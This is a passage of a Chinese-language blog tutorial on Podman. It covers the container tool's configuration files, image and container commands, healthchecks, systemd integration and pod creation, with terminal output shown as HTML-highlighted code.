class="string">"bridge"</span>,</span><br><span class="line">        <span class="string">"bridge"</span>: <span class="string">"cni0"</span>,</span><br><span class="line">        <span class="string">"isGateway"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"ipMasq"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"ipam"</span>: &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"host-local"</span>,</span><br><span class="line">            <span class="string">"subnet"</span>: <span class="string">"10.88.0.0/16"</span>,</span><br><span class="line">            <span class="string">"routes"</span>: [</span><br><span class="line">                &#123; <span class="string">"dst"</span>: <span class="string">"0.0.0.0/0"</span> &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"portmap"</span>,</span><br><span class="line">        <span class="string">"capabilities"</span>: &#123;</span><br><span class="line">          <span class="string">"portMappings"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面我们有提到，Podman 依赖的 containers-common RPM 中包含了很多配置文件，我们一个一个的来看一下：</p><h4 id="registries-conf"><a href="#registries-conf" class="headerlink" title="registries.conf"></a>registries.conf</h4><p>/etc/containers/registries.conf 用于保存 registries 相关配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /etc/containers/registries.conf         </span><br><span class="line"><span class="comment"># This is a system-wide configuration file used to</span></span><br><span class="line"><span class="comment"># keep track of registries for various container backends.</span></span><br><span class="line"><span class="comment"># It adheres to TOML format and does not support recursive</span></span><br><span class="line"><span class="comment"># lists of registries.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The default location for this configuration file is /etc/containers/registries.conf.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The only valid categories are: 'registries.search', 'registries.insecure', </span></span><br><span class="line"><span class="comment"># and 'registries.block'.</span></span><br><span class="line"></span><br><span class="line">[registries.search]</span><br><span class="line">registries = [<span class="string">'registry.redhat.io'</span>, <span class="string">'quay.io'</span>, <span class="string">'docker.io'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># If you need to access insecure registries, add the registry's fully-qualified name.</span></span><br><span class="line"><span class="comment"># An insecure registry is one that does not have a valid SSL certificate or only does HTTP.</span></span><br><span class="line">[registries.insecure]</span><br><span class="line">registries = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you need to block pull access from a registry, uncomment the section below</span></span><br><span class="line"><span class="comment"># and add the registries fully-qualified name.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Docker only</span></span><br><span class="line">[registries.block]</span><br><span class="line">registries = []</span><br></pre></td></tr></table></figure><h4 id="mounts-conf"><a href="#mounts-conf" class="headerlink" title="mounts.conf"></a>mounts.conf</h4><p><code>/usr/share/containers/mounts.conf</code> 在执行 <code>podman run</code> 或者 <code>podman build</code> 命令时自动挂载的路径，该路径只会在容器运行时挂载，不会提交到容器镜像中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /usr/share/containers/mounts.conf                               </span><br><span class="line">/usr/share/rhel/secrets:/run/secrets</span><br></pre></td></tr></table></figure><h4 id="seccomp-json"><a href="#seccomp-json" class="headerlink" title="seccomp.json"></a>seccomp.json</h4><p><code>/usr/share/containers/seccomp.json</code> 是容器内允许的 seccomp 规则白名单。 seccomp（secure computing）是一种安全保护机制，一般情况下，程序可以使用所有的 syscall，但是为了避免安全问题发生，通常会指定相应的规则来保证。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /usr/share/containers/seccomp.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"defaultAction"</span>: <span class="string">"SCMP_ACT_ERRNO"</span>,</span><br><span class="line"><span class="string">"archMap"</span>: [...],</span><br><span class="line"><span class="string">"syscalls"</span>: [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="policy-json"><a href="#policy-json" class="headerlink" title="policy.json"></a>policy.json</h4><p><code>/etc/containers/policy.json</code>  证书安全相关配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /etc/containers/policy.json      </span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"default"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"insecureAcceptAnything"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"transports"</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"docker-daemon"</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">""</span>: [&#123;<span class="string">"type"</span>:<span class="string">"insecureAcceptAnything"</span>&#125;]</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h4><h5 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ <span class="built_in">pwd</span>                                                                                                                                  1 ↵</span><br><span class="line">/home/yiran/podman/hello</span><br><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ cat Dockerfile </span><br><span class="line">FROM docker.io/library/centos:latest</span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">'hello'</span></span><br><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ podman build -t hello:1.0 .    </span><br><span class="line">STEP 1: FROM docker.io/library/centos:latest</span><br><span class="line">STEP 2: RUN <span class="built_in">echo</span> <span class="string">'hello'</span></span><br><span class="line">hello</span><br><span class="line">--&gt; 895ce449f0b3f1f2d8a0d2dca280cb46f4c69bb2824c93bb0e72eb49987c9050</span><br><span class="line">STEP 3: COMMIT hello:1.0</span><br><span class="line">--&gt; 618f931bc244f2eaff53d9f2bcb1df97c5ddac501088d5919450a57f995173af</span><br><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ podman images               </span><br><span class="line">REPOSITORY                             TAG      IMAGE ID       CREATED          SIZE</span><br><span class="line">localhost/hello                        1.0      618f931bc244   8 seconds ago    210 MB</span><br><span class="line">&lt;none&gt;                                 &lt;none&gt;   895ce449f0b3   13 seconds ago   210 MB</span><br><span class="line">docker.io/library/nginx                latest   f949e7d76d63   2 weeks ago      130 MB</span><br><span class="line">docker.io/library/centos               latest   67fa590cfc1c   7 weeks ago      210 MB</span><br><span class="line">registry.fedoraproject.org/f27/httpd   latest   18f01f6f77ef   15 months ago    426 MB</span><br></pre></td></tr></table></figure><h5 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman search mongo |head -n 5</span><br><span class="line">INDEX       NAME                                                 DESCRIPTION                                       STARS   OFFICIAL   AUTOMATED</span><br><span class="line">quay.io     quay.io/hellofresh/delete-old-ahoy-mongo-dbs                                                           0                  </span><br><span class="line">quay.io     quay.io/ukhomeofficedigital/mongo-34                                                                   0                  </span><br><span class="line">quay.io     quay.io/utilitywarehouse/mongo-burs                                                                    0                  </span><br><span class="line">quay.io     quay.io/ukhomeofficedigital/mongo                                                                      0</span><br></pre></td></tr></table></figure><h5 id="拉取"><a href="#拉取" class="headerlink" title="拉取"></a>拉取</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman image pull nginx</span><br><span class="line">Trying to pull registry.redhat.io/nginx:latest...Failed</span><br><span class="line">Trying to pull quay.io/nginx:latest...Failed</span><br><span class="line">Trying to pull docker.io/nginx:latest...Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob b8f262c62ec6: 25.84 MiB / 25.84 MiB [=========================] 13s</span><br><span class="line">Copying blob e9218e8f93b1: 22.48 MiB / 22.48 MiB [=========================] 13s</span><br><span class="line">Copying blob 7acba7289aa3: 202 B / 202 B [=================================] 13s</span><br><span class="line">Copying config f949e7d76d63: 6.51 KiB / 6.51 KiB [==========================] 0s</span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">f949e7d76d63befffc8eec2cbf8a6f509780f96fb3bacbdc24068d594a77f043</span><br></pre></td></tr></table></figure><p>除了像 Docker 一样从网络拉取镜像，Podman 为了方便用户从 Docker 迁移过来，Podman 支持从本地的 docker daemon 中直接拉取镜像，如果没有 domain 的话，目前会自动补全 <code>docker.io/library/</code> 前缀。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ docker images |grep yiran</span><br><span class="line">harbor.yiran.com/yiran_tuna/leader-elector                                   0.5                           129c97fdb20d        3 years ago         169MB</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman pull docker-daemon:harbor.yiran.com/yiran_tuna/leader-elector:0.5</span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob bf87964bccfd <span class="keyword">done</span></span><br><span class="line">Copying blob 5f70bf18a086 <span class="keyword">done</span></span><br><span class="line">Copying blob 3efb68385a82 <span class="keyword">done</span></span><br><span class="line">Copying blob 5f70bf18a086 <span class="keyword">done</span></span><br><span class="line">Copying blob 42755cf4ee95 <span class="keyword">done</span></span><br><span class="line">Copying blob ce31f2e01592 <span class="keyword">done</span></span><br><span class="line">Copying blob 5f70bf18a086 skipped: already exists</span><br><span class="line">Copying config 129c97fdb2 <span class="keyword">done</span></span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">129c97fdb20d5fb7a0c569994f710c2b0d5292219f189f4f66c313f7bed9f434</span><br></pre></td></tr></table></figure><p>看上去一切都很美好，但是要注意下面这种错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERRO[0005] Error pulling image ref //testimg:latest: Error committing the finished image: error adding layer with blob &quot;sha256:caed8f108bf6721dc2709407ecad964c83a31c8008a6a21826aa4ab995df5502&quot;: Error processing tar file(exit status 1): there might not be enough IDs available in the namespace (requested 4000000:4000000 for /testfile): lchown /testfile: invalid argument</span><br></pre></td></tr></table></figure><p>因为 Podman 可以用普通用户运行容器，平时操作时也都是普通用户，这时候我们就面临一个UID &amp; GID 映射的问题，默认的 subuid 的上限是 65536，这个可以自己做相应的调整：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ cat /etc/subuid</span><br><span class="line">yiran:100000:65536</span><br><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ cat /etc/subgid</span><br><span class="line">yiran:100000:65536</span><br></pre></td></tr></table></figure><p>不只是在镜像拉取过程中，在操作文件时，也需要关注 UID &amp; GID 的问题，这个是之前使用 Docker 忽略的点。</p><h5 id="列出"><a href="#列出" class="headerlink" title="列出"></a>列出</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman images</span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED       SIZE</span><br><span class="line">docker.io/library/nginx    latest   f949e7d76d63   7 days ago    130 MB</span><br><span class="line">docker.io/library/centos   latest   67fa590cfc1c   6 weeks ago   210 MB</span><br></pre></td></tr></table></figure><h5 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman image inspect docker.io/library/nginx |head -n 10</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"Id"</span>: <span class="string">"f949e7d76d63befffc8eec2cbf8a6f509780f96fb3bacbdc24068d594a77f043"</span>,</span><br><span class="line">        <span class="string">"Digest"</span>: <span class="string">"sha256:066edc156bcada86155fd80ae03667cf3811c499df73815a2b76e43755ebbc76"</span>,</span><br><span class="line">        <span class="string">"RepoTags"</span>: [</span><br><span class="line">            <span class="string">"docker.io/library/nginx:latest"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"RepoDigests"</span>: [</span><br><span class="line">            <span class="string">"docker.io/library/nginx@sha256:066edc156bcada86155fd80ae03667cf3811c499df73815a2b76e43755ebbc76"</span></span><br><span class="line">        ],</span><br></pre></td></tr></table></figure><h5 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman image rm docker.io/library/nginx                 </span><br><span class="line">f949e7d76d63befffc8eec2cbf8a6f509780f96fb3bacbdc24068d594a77f043</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman images                          </span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED       SIZE</span><br><span class="line">docker.io/library/centos   latest   67fa590cfc1c   6 weeks ago   210 MB</span><br></pre></td></tr></table></figure><h4 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h4><h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman images                             </span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED       SIZE</span><br><span class="line">docker.io/library/centos   latest   67fa590cfc1c   6 weeks ago   210 MB</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman run -it docker.io/library/centos sh</span><br><span class="line">sh-4.2<span class="comment"># cat /etc/centos-release</span></span><br><span class="line">CentOS Linux release 7.6.1810 (Core) </span><br><span class="line">sh-4.2<span class="comment"># exit</span></span><br></pre></td></tr></table></figure><h5 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps                                                                                               </span><br><span class="line">[sudo] password <span class="keyword">for</span> yiran: </span><br><span class="line">CONTAINER ID  IMAGE                                        COMMAND               CREATED        STATUS            PORTS                   NAMES</span><br><span class="line">af3d9001ad32  registry.fedoraproject.org/f27/httpd:latest  container-entrypo...  8 minutes ago  Up 8 minutes ago  0.0.0.0:8080-&gt;8080/tcp  elastic_goldwasser</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman stop af3d9001ad32</span><br><span class="line">af3d9001ad3211f5503742ca3cca8ddca542e27d7b9e54099c56ab7e04778503</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps               </span><br><span class="line">CONTAINER ID  IMAGE  COMMAND  CREATED  STATUS  PORTS  NAMES</span><br></pre></td></tr></table></figure><h5 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps -a</span><br><span class="line">CONTAINER ID  IMAGE                                        COMMAND               CREATED        STATUS                     PORTS                   NAMES</span><br><span class="line">af3d9001ad32  registry.fedoraproject.org/f27/httpd:latest  container-entrypo...  8 minutes ago  Exited (0) 29 seconds ago  0.0.0.0:8080-&gt;8080/tcp  elastic_goldwasser</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman rm af3d9001ad32                                                                                       </span><br><span class="line">af3d9001ad3211f5503742ca3cca8ddca542e27d7b9e54099c56ab7e04778503</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps -a          </span><br><span class="line">CONTAINER ID  IMAGE  COMMAND  CREATED  STATUS  PORTS  NAMES</span><br></pre></td></tr></table></figure><h5 id="checkpoint-restore"><a href="#checkpoint-restore" class="headerlink" title="checkpoint/restore"></a>checkpoint/restore</h5><p>Podman 提供了类似于 git 的功能，能够对 container 进行 checkpoint(commit)，并且可以 restore(checkout)，虽然 <a href="https://podman.io/blogs/2018/10/10/checkpoint-restore.html" target="_blank" rel="noopener">demo 视频</a> 很美好，但是我本地想通过快照（虚拟化功能）的方式来验证，却发现因为 CRIU 的版本过低不支持该功能，等后续深度使用后再研究下这个功能的原理。</p><h5 id="健康检查"><a href="#健康检查" class="headerlink" title="健康检查"></a>健康检查</h5><p>Podman 1.2.0 版本提供了 healthcheck 功能，我们在运行容器时，可以通过参数 <code>--healthcheck-command</code> 来指定健康检查的方式，然后通过 <code>podman healthcheck</code> 命令来检测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo podman run -dt --name hc1 --healthcheck-command <span class="string">'CMD-SHELL curl http://localhost || exit 1'</span> --healthcheck-interval=0 quay.io/libpod/alpine_nginx:latest</span><br><span class="line">d25ee6faaf6e5e12c09e734b1ac675385fe4d4e8b52504dd01a60e1b726e3edb</span><br><span class="line">$ sudo podman healthcheck run hc1</span><br><span class="line">Healthy</span><br><span class="line">$ <span class="built_in">echo</span> $?</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p><code>--healthcheck-command</code> 命令是在容器内执行的，所以我们需要保证容器镜像中存在相应命令； <code>--healthcheck-interval</code> 如果设置为 0 则不自动检查。</p><h5 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h5><p>由于 Podman 没有 daemon ，所以没办法像 docker 一样通过指定参数 <code>--restart=always</code> 在 docker 进程启动时自动拉起镜像。 Podman 通过 systemd 来支持该功能。</p><p>首先，我们需要准备一个已经可以正常运行的容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman ps </span><br><span class="line">CONTAINER ID  IMAGE                                  COMMAND               CREATED                 STATUS                     PORTS  NAMES</span><br><span class="line">cf6b656d4ab0  docker.io/library/envoy:latest  /usr/bin/mongod -...  Less than a second ago  Up Less than a second ago         smtx-mongodb</span><br></pre></td></tr></table></figure><p>编写 systemd 配置文件，通常默认路径为： /usr/lib/systemd/system/</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /usr/lib/systemd/system/envoy.service </span><br><span class="line">[Unit]</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Restart=always</span><br><span class="line">ExecStart=/usr/bin/podman start -a envoy</span><br><span class="line">ExecStop=/usr/bin/podman stop -t 10 envoy</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>编写完成后，我们需要执行下 <code>systemctl daemon-reload</code> 重新加载一次配置，然后就可以通过 <code>systemctl</code> 来控制容器的启停、开机自启动了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ systemctl start envoy</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ systemctl <span class="built_in">enable</span> envoy</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/envoy.service to /usr/lib/systemd/system/envoy.service.</span><br><span class="line">[root@node99 16:28:12 ~]<span class="variable">$systemctl</span> status envoy</span><br><span class="line">● envoy.service</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/envoy.service; enabled; vendor preset: disabled)</span><br><span class="line">  Drop-In: /etc/systemd/system/envoy.service.d</span><br><span class="line">           └─cgroup.conf</span><br><span class="line">   Active: active (running) since Sat 2019-10-12 20:09:34 CST; 3h 41min left</span><br><span class="line"> Main PID: 47684 (podman)</span><br><span class="line">   CGroup: /system.slice/system-zbs.slice/system-zbs-others.slice/envoy.service</span><br><span class="line">           └─47684 /usr/bin/podman start -a envoy</span><br></pre></td></tr></table></figure><h4 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h4><h5 id="创建及使用"><a href="#创建及使用" class="headerlink" title="创建及使用"></a>创建及使用</h5><p>Podman 除了像 Docker 一样提供基本的容器管理，还提供了 K8S 中的 Pod 功能（得对的起名字啊）。<br>对于最终要运行在 k8s 环境的同学来说，Podman 非常适合，可以很大的减少环境不通导致的工作量：Podman 的 YAML 和 k8s pod yaml 文件格式是兼容的。</p><p>首先，我们来创建一个 Pod：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod create --name postgresql -p 5432 -p 9187</span><br><span class="line">error adding Infra Container: unable to pull k8s.gcr.io/pause:3.1: unable to pull image: Error determining manifest MIME <span class="built_in">type</span> <span class="keyword">for</span> docker://k8s.gcr.io/pause:3.1: pinging docker registry returned: Get https://k8s.gcr.io/v2/: dial tcp 64.233.189.82:443: i/o timeout</span><br></pre></td></tr></table></figure><p>了解 K8S Pod 的同学应该知道 <code>google_containers/pause</code>容器，它主要的作用是 namespace  控制和启动 init 进程，即 PID 为1。在 Podman 中也是如此，这里需要 pull pause 镜像，但是喜闻乐见的 timeout。。。。</p><p>（此处开始折腾网络）</p><p>我们重新来走一次 demo ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod create --name postgresql -p 5432 -p 9187  <span class="comment"># 创建 Pod，并映射端口</span></span><br><span class="line">17020cd16ae689f5d4e0f17468c67c3f9d3b8aa424d9e463dc8b187bb80bd328</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod ls                                      </span><br><span class="line">POD ID         NAME         STATUS    CREATED         <span class="comment"># OF CONTAINERS   INFRA ID</span></span><br><span class="line">17020cd16ae6   postgresql   Running   7 seconds ago   1                 5f38e2d70484</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod ps </span><br><span class="line">POD ID         NAME         STATUS    CREATED          <span class="comment"># OF CONTAINERS   INFRA ID</span></span><br><span class="line">17020cd16ae6   postgresql   Running   23 seconds ago   1                 5f38e2d70484</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman run -d --pod postgresql -e POSTGRES_PASSWORD=password postgres:latest <span class="comment"># 运行 postgresql</span></span><br><span class="line">bb00b1087b3e86f5f8915deb9a826875f4a1f063b30ef6eb743c3ad6b155a823</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman run -d --pod postgresql -e DATA_SOURCE_NAME=<span class="string">"postgresql://postgres:password@localhost:5432/postgres?sslmode=disable"</span>  wrouesnel/postgres_exporter <span class="comment"># 运行 postgres exporter</span></span><br><span class="line">f1197be2aa8be6169e0a0cf3b235b951dafdc4e98afe6753c661a9871038c17c</span><br></pre></td></tr></table></figure><p>首先我们创建了一个 Pod，端口映射是在 Pod 这个级别配置的，然后在这个 Pod 中，我们创建了两个 container，分别是：postgres 和 postgres_exporter ，其中 postgres_exporter 主要是暴露 metrics 用于 Prometheus 抓取进行监控。</p><p>我们可以通过 curl 相应端口来验证是否正常工作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">iran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps -a              </span><br><span class="line">CONTAINER ID  IMAGE                                                          